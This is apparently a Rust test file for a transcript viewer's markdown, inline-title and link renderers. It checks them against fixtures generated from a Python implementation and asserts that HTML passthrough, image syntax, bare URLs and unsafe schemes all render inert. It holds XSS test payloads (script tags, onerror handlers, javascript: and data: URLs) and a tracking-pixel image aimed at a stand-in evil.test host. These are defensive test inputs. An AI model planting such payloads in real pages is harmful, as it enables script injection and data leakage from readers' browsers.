//! The escaping contract, against the Python that already serves it.
//!
//! Both renderers are ports, and the thing being ported is a security boundary — so the
//! expected side is generated from `hyphae.view` rather than typed here. The cases live in
//! `tests/fixtures/render_cases.json`; `render_cases_from_python.py` beside it writes them.

use std::fs;
use std::path::PathBuf;

use hyphae_view::{inline_markdown, render};
use serde_json::Value;

/// The generated cases, read once.
fn cases() -> Value {
    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/render_cases.json");
    let text =
        fs::read_to_string(&path).expect("the generated cases are committed beside the test");
    serde_json::from_str(&text).expect("the generator writes JSON")
}

/// Every string in a case, so a mismatch names the input and the surface rather than an index.
fn field<'a>(case: &'a Value, name: &str) -> &'a str {
    case[name]
        .as_str()
        .unwrap_or_else(|| panic!("the generator writes `{name}` for every case"))
}

#[test]
fn a_title_renders_the_way_the_python_viewer_renders_it() {
    let cases = cases();
    let titles = cases["titles"].as_array().expect("titles is a list");
    assert!(
        titles.len() > 10,
        "the generator writes the whole sentinel set"
    );
    for case in titles {
        let text = Some(field(case, "text"));
        // The pane's own heading, which is the one surface allowed to carry a link.
        assert_eq!(
            inline_markdown::render(text, true).into_inner(),
            field(case, "render_links"),
            "render(links) differs for {text:?}"
        );
        // Every other surface: a NavTree row, a crumb, a walk control.
        assert_eq!(
            inline_markdown::render(text, false).into_inner(),
            field(case, "render_plain"),
            "render(no links) differs for {text:?}"
        );
        // A surface's own width, spent on what a reader sees.
        assert_eq!(
            inline_markdown::cut(text, 20, false, 10_000).into_inner(),
            field(case, "cut_20"),
            "cut at 20 differs for {text:?}"
        );
        // The *query's* width: a line the store already stopped renders with the mark even
        // when the surface had room for all of it.
        assert_eq!(
            inline_markdown::cut(text, 200, false, 8).into_inner(),
            field(case, "cut_capped"),
            "cut under a source cap differs for {text:?}"
        );
        // What a `title=` attribute and the browser tab carry.
        assert_eq!(
            inline_markdown::strip(text),
            field(case, "strip"),
            "strip differs for {text:?}"
        );
    }
}

#[test]
fn a_block_of_prose_renders_the_way_the_python_viewer_renders_it() {
    let cases = cases();
    let mut excused = 0;
    for case in cases["blocks"].as_array().expect("blocks is a list") {
        let text = field(case, "text");
        let shown = render::markdown(Some(text)).into_inner();
        // A fence whose language the Python has a lexer for takes the highlighter's path,
        // which this crate does not have yet. It renders as the escaped `<pre class="code">`
        // the Python itself serves for a language with no lexer — so what is excused here is
        // the marking up, not the escaping.
        if case["highlighted"] == true {
            excused += 1;
            assert!(
                shown.starts_with("<pre class=\"code\">"),
                "unhighlighted for {text:?}"
            );
            assert!(!shown.contains("<span"), "nothing marked up for {text:?}");
            continue;
        }
        assert_eq!(shown, field(case, "html"), "markdown differs for {text:?}");
    }
    assert_eq!(
        excused, 2,
        "the two lexed fences stand for the highlighter, and both are still in the set"
    );
}

#[test]
fn a_url_becomes_a_link_only_where_the_python_viewer_makes_one() {
    let cases = cases();
    for case in cases["links"].as_array().expect("links is a list") {
        let url = field(case, "url");
        assert_eq!(
            render::link(Some(url)).into_inner(),
            field(case, "html"),
            "link differs for {url:?}"
        );
    }
}

/// The two absent cases, which the generator cannot write: Python spells them `None`.
#[test]
fn an_absent_value_renders_nothing() {
    assert_eq!(inline_markdown::render(None, true).into_inner(), "");
    assert_eq!(inline_markdown::strip(None), "");
    assert_eq!(render::markdown(None).into_inner(), "");
    assert_eq!(render::link(None).into_inner(), "");
}

/// What a transcript's own text is allowed to do once it reaches a page: nothing.
///
/// The three leaves above hold this crate to the Python byte for byte, which is the strongest
/// check there is *between* two implementations and no check at all on the pair — a rule
/// turned back on in both would agree with itself. So the security claims are also made
/// absolutely, here, against neither implementation's output but against the page a browser
/// would build. Every input is invented, and has to be: redaction flattens every string in the
/// fixture corpus, so no recorded session carries a payload.
#[test]
fn nothing_a_transcript_wrote_becomes_an_element_the_browser_acts_on() {
    // HTML passthrough, in a block and inline. markdown-it's `commonmark` preset turns it on,
    // so both are one constructor argument away from being undone.
    let block = render::markdown(Some("before\n\n<script>alert(1)</script>\n\nafter")).into_inner();
    assert!(
        block.contains("&lt;script&gt;alert(1)&lt;/script&gt;"),
        "{block}"
    );
    assert!(!block.contains("<script"), "{block}");
    // The markdown around it still renders, so the pin costs the reader nothing.
    assert!(block.contains("<p>before</p>"), "{block}");
    let inline =
        render::markdown(Some("a paragraph with <img src=x onerror=alert(1)> in it")).into_inner();
    assert!(!inline.contains("<img"), "{inline}");
    assert!(inline.contains("onerror=alert(1)&gt;"), "{inline}");

    // Image syntax is a second, independent hole: an `<img src>` the page emits is a request
    // the browser makes on load, with no click and no passthrough involved. Note the `href`:
    // simply disabling the image rule hands the syntax to the link rule, which puts the same
    // host straight back in an attribute.
    let image = render::markdown(Some("![pixel](https://evil.test/px?d=1)")).into_inner();
    for attribute in ["<img", "src=\"", "href=\""] {
        assert!(!image.contains(attribute), "{image}");
    }
    // While the alt text and the URL stay visible, so a reader sees what was written.
    assert!(
        image.contains("[image: pixel — https://evil.test/px?d=1]"),
        "{image}"
    );

    // Linkify is off: text that looks like a URL stays text.
    let bare = render::markdown(Some("see https://evil.test/path for details")).into_inner();
    assert!(!bare.contains("href=\"http"), "{bare}");
    assert!(bare.contains("https://evil.test/path"), "{bare}");

    // A URL a browser should follow is a link, upper-case scheme and all; every other scheme
    // is shown as text, and a quote in one cannot close the attribute it lands in.
    for followed in ["https://example.test/pr/1", "HTTP://example.test/"] {
        let shown = render::link(Some(followed)).into_inner();
        assert!(shown.contains(&format!("href=\"{followed}\"")), "{shown}");
    }
    for refused in [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "file:///etc",
    ] {
        let shown = render::link(Some(refused)).into_inner();
        assert!(!shown.contains("href"), "{shown}");
        assert!(!shown.contains("<script>"), "{shown}");
        // The reader still sees what the transcript wrote.
        let scheme = refused.split(':').next().expect("a scheme");
        assert!(shown.contains(scheme), "{shown}");
    }
    assert!(
        render::link(Some("https://example.test/?q=\""))
            .into_inner()
            .contains("href=\"https://example.test/?q=&#34;"),
    );

    // A fence is not a way around any of it. Both arms are checked because they escape in
    // different places — a lexed block by the highlighter, an unlexed one by the renderer.
    for info in ["json", "html"] {
        let fenced = render::markdown(Some(&format!(
            "```{info}\n{{\"a\": \"<img src=x onerror=y>\"}}\n```"
        )))
        .into_inner();
        assert!(!fenced.contains("<img"), "{info}: {fenced}");
        assert!(
            fenced.contains("&lt;img src=x onerror=y&gt;"),
            "{info}: {fenced}"
        );
    }

    // And every one of them again on the renderer that reaches a NavTree row, a crumb and the
    // browser tab, which is a different parser with its own rules.
    for links in [true, false] {
        let title = inline_markdown::render(Some("<script>alert(1)</script>"), links).into_inner();
        assert!(!title.contains("<script"), "{title}");
        let handler = inline_markdown::render(
            Some("a title with <img src=x onerror=alert(1)> in it"),
            links,
        )
        .into_inner();
        assert!(!handler.contains("<img"), "{handler}");
        let pixel =
            inline_markdown::render(Some("![pixel](https://evil.test/px?d=1)"), links).into_inner();
        for attribute in ["<img", "src=\"", "href=\""] {
            assert!(!pixel.contains(attribute), "{pixel}");
        }
        // A link is an `<a>` in the pane's heading and text everywhere else, so the one
        // surface that carries one is also the only one that may.
        let linked =
            inline_markdown::render(Some("[x](https://example.test/pr/1)"), links).into_inner();
        assert_eq!(
            linked.contains("href=\"https://example.test/pr/1\""),
            links,
            "{linked}"
        );
        // And a scheme a browser should not follow reaches no `href` on either surface.
        let bad = inline_markdown::render(Some("[bad](javascript:alert(1))"), links).into_inner();
        assert!(!bad.contains("href"), "{bad}");
    }
    // The tab and every `title=` attribute get the characters alone.
    assert_eq!(
        inline_markdown::strip(Some("<script>alert(1)</script>")),
        "<script>alert(1)</script>"
    );
}
